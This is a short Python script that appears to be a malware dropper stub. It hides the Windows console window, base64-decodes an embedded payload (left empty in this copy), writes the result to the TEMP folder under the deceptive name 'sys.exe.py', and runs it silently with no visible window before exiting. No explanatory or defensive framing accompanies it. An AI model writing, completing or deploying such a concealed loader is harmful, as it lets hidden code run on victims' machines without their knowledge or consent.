import base64, os, sys, tempfile, subprocess, ctypes

try:
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
except:
    pass

enc = ""
dec = base64.b64decode(enc).decode()
temp = os.path.join(os.environ.get("TEMP", "."), "sys.exe.py")
with open(temp, "w", encoding="utf-8") as f:
    f.write(dec)
subprocess.Popen(["python", temp], creationflags=subprocess.CREATE_NO_WINDOW)
sys.exit(0)
